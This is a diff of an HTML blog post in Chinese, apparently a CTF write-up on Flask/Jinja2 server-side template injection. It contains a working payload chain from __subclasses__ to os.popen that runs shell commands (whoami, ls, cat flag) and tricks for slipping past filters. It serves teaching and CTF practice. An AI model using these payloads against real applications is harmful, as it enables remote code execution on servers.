@@ -472,7 +472,7 @@
 
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''' % (request.args.get('404_url'))</span></span><br><span class="line"><span class="string">    return render_template_string(template), 404</span></span><br></pre></td></tr></table></figure>
 
-<p>注意，这里request.args.get (‘用户可控参数’)可以直接把回显传回页面中，并且利用不正确的渲染会产生SSTI，也就是说，SSTI产生的条件在于！！！flask中要存在用户可控的参数！！！</p>
+<p>注意，这里request.args.get (‘用户可控参数’)可以直接把回显传回页面中，并且利用不正确的渲染会产生SSTI，也就是说，SSTI产生的条件在于flask中要存在用户可控的参数</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">render_template_string&#96;函数在渲染模板的时候使用了%s来动态的替换字符串，我们知道Flask 中使用了Jinja2 作为模板渲染引擎，&#96;&#123;&#123;&#125;&#125;&#96;在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把&#96;&#123;&#123;&#125;&#125;&#96;包裹的内容当做变量解析替换。比如&#96;&#123;&#123;1+1&#125;&#125;&#96;会被解析成2</span><br></pre></td></tr></table></figure>
 
 
@@ -493,36 +493,36 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;ip:port&#x2F;&#123;&#123;x+y&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 <p>​        测试2</p>
-<p><img src="E:%5Cstudy%5Cprogram%5Cblog%5Csource_posts%5CPython-SSTI%5Cimage-20200507194615730.png" alt="image-20200507194615730"></p>
-<p><img src="E:%5Cstudy%5Cprogram%5Cblog%5Csource_posts%5CPython-SSTI%5Cimage-20200507194623344.png" alt="image-20200507194623344"></p>
+<p><img src="%5CPython-SSTI%5Cimage-20200507194615730.png" alt="image-20200507194615730"></p>
+<p><img src="%5CPython-SSTI%5Cimage-20200507194623344.png" alt="image-20200507194623344"></p>
 <p>​        测试49</p>
-<p><img src="E:%5Cstudy%5Cprogram%5Cblog%5Csource_posts%5CPython-SSTI%5Cimage-20200507194644948.png" alt="image-20200507194644948"></p>
+<p><img src="%5CPython-SSTI%5Cimage-20200507194644948.png" alt="image-20200507194644948"></p>
 <p>​        可见在回显中出现上述计算的结果，说明该位置的参数是用户可控的，使用config尝试读取配置信息</p>
-<p><img src="E:%5Cstudy%5Cprogram%5Cblog%5Csource_posts%5CPython-SSTI%5Cimage-20200507195006930.png" alt="image-20200507195006930"></p>
+<p><img src="%5CPython-SSTI%5Cimage-20200507195006930.png" alt="image-20200507195006930"></p>
 <p>成功得到了config的变量信息</p>
 <p>​        到这里，就基本判断存在此处存在SSTI，下面开始注入。</p>
 <hr>
 <p>​        首先，获取Object基类(要获取到object再操作)：</p>
-<p><img src="E:%5Cstudy%5Cprogram%5Cblog%5Csource_posts%5CPython-SSTI%5Cimage-20200507195323949.png" alt="image-20200507195323949"></p>
-<p><img src="E:%5Cstudy%5Cprogram%5Cblog%5Csource_posts%5CPython-SSTI%5Cimage-20200507195239753.png" alt="image-20200507195239753"></p>
+<p><img src="%5CPython-SSTI%5Cimage-20200507195323949.png" alt="image-20200507195323949"></p>
+<p><img src="%5CPython-SSTI%5Cimage-20200507195239753.png" alt="image-20200507195239753"></p>
 <p>​        获取所有的子类：</p>
-<p><img src="E:%5Cstudy%5Cprogram%5Cblog%5Csource_posts%5CPython-SSTI%5Cimage-20200507195421450.png" alt="image-20200507195421450"></p>
+<p><img src="%5CPython-SSTI%5Cimage-20200507195421450.png" alt="image-20200507195421450"></p>
 <p>​        找不到可以直接利用的OS或者FILE文件，使用init.globals看看subclasses()中某个类有没有使用OS等模块可以利用</p>
 <p>​        以subclasses()[300]为例：</p>
-<p><img src="E:%5Cstudy%5Cprogram%5Cblog%5Csource_posts%5CPython-SSTI%5Cimage-20200507195725447.png" alt="image-20200507195725447"></p>
+<p><img src="%5CPython-SSTI%5Cimage-20200507195725447.png" alt="image-20200507195725447"></p>
 <p>​        利用burp对[$***$]爆破,范围1-999：</p>
-<p><img src="E:%5Cstudy%5Cprogram%5Cblog%5Csource_posts%5CPython-SSTI%5Cimage-20200507195843543.png" alt="image-20200507195843543"></p>
+<p><img src="%5CPython-SSTI%5Cimage-20200507195843543.png" alt="image-20200507195843543"></p>
 <p>​        找到一个可以利用os.py的项：</p>
-<p><img src="E:%5Cstudy%5Cprogram%5Cblog%5Csource_posts%5CPython-SSTI%5Cimage-20200507195941501.png" alt="image-20200507195941501"></p>
+<p><img src="%5CPython-SSTI%5Cimage-20200507195941501.png" alt="image-20200507195941501"></p>
 <p>​        直接利用os.py尝试使用shell：</p>
-<p><img src="E:%5Cstudy%5Cprogram%5Cblog%5Csource_posts%5CPython-SSTI%5Cimage-20200507200225064.png" alt="image-20200507200225064"></p>
+<p><img src="%5CPython-SSTI%5Cimage-20200507200225064.png" alt="image-20200507200225064"></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:ip:port/&#123;&#123;[].__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">329</span>].__init__.globals__[<span class="string">'os'</span>][<span class="string">'popen'</span>](<span class="string">'whoami'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 <p>​        解释一下，意思就是调用<strong>subclass</strong>()[329]这一项中利用的os模块，使用os模块中的popen函数，开启进程使用shell，以读的方式得到whoami的值，可以看到得到了root用户。</p>
 <p>​        继续利用shell查看当前目录ls，发现了flog字样：</p>
-<p><img src="E:%5Cstudy%5Cprogram%5Cblog%5Csource_posts%5CPython-SSTI%5Cimage-20200507200305940.png" alt="image-20200507200305940"></p>
+<p><img src="%5CPython-SSTI%5Cimage-20200507200305940.png" alt="image-20200507200305940"></p>
 <p>​        查看flog文件cat flog，得到flag：</p>
-<p><img src="E:%5Cstudy%5Cprogram%5Cblog%5Csource_posts%5CPython-SSTI%5Cimage-20200507200426437.png" alt="image-20200507200426437"></p>
+<p><img src="%5CPython-SSTI%5Cimage-20200507200426437.png" alt="image-20200507200426437"></p>
 <h4 id="被WAF了怎么绕过？"><a href="#被WAF了怎么绕过？" class="headerlink" title="被WAF了怎么绕过？"></a>被WAF了怎么绕过？</h4><h5 id="引号过滤："><a href="#引号过滤：" class="headerlink" title="引号过滤："></a>引号过滤：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:ip:port/&#123;&#123;[].__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">329</span>].__init__.globals__[<span class="string">'os'</span>][<span class="string">'popen'</span>](<span class="string">'whoami'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 <p>​        由于python3中如果不是原生字符就默认不区分单双引号，这里就不强调引号的写法了。在这个payload中，<strong>class</strong> 前的’’可以使用[]代替，下面就是os和popen的引号如何替换</p>
@@ -574,7 +574,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from imp import reload</span><br><span class="line">reload(os).popen(&quot;whoami&quot;).read()</span><br></pre></td></tr></table></figure>
 
 <p>​        如果os也被阉割，可以使用</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reload(__builtins__)  重新载入builtins,之后就可以重新使用eval,import...</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reload(__builtins__)  重新载入builtins,之后就可以重新使用eval,import</span><br></pre></td></tr></table></figure>
 
 <h6 id="与os类似的模块"><a href="#与os类似的模块" class="headerlink" title="与os类似的模块"></a>与os类似的模块</h6><p>​        subprocess:<strong>启动一个新的进程并与之通信</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">subprocess.call(“command”)   </span><br><span class="line">subprocess.Popen(“command”)</span><br></pre></td></tr></table></figure>
